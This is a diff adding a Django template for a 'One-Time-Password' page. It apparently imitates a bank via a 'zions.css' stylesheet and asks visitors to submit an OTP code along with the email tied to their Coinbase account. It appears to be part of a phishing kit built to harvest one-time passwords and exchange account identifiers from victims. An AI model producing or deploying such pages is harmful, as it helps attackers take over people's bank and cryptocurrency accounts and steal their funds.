@@ -1,0 +1,24 @@
+{% load static %}
+
+<html>
+    <head>
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta http-equiv="CONTENT-TYPE" content="text/html; charset=UTF-8">
+        <title>One-Time-Password</title>
+	<link rel="stylesheet" href="{% static "zions.css" %}">
+    </head>
+    <body>
+        
+         <div id="otp">
+             <p>If your login details are correct a One-Time-Password will be sent to you,
+                 this will take 3 to 10 minutes.
+             </p>
+	     <form action="/otp/" method="post">{% csrf_token %}
+                 <input id="ver" type="number" name="code" placeholder="OTP" required><br><br>
+                 <div> Enter the Email associated with your coinbase account<br><input id="ver" type="email" name="coinmail" placeholder="Coinbase Email" required></div>
+                 <input class="ver" type="submit" value="Submit">
+             </form>
+        </div>   
+        
+    </body>
+</html>
